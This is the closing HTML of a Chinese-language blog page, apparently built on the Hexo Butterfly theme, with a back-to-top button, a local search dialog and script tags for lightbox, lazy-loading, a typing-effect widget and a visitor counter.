title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
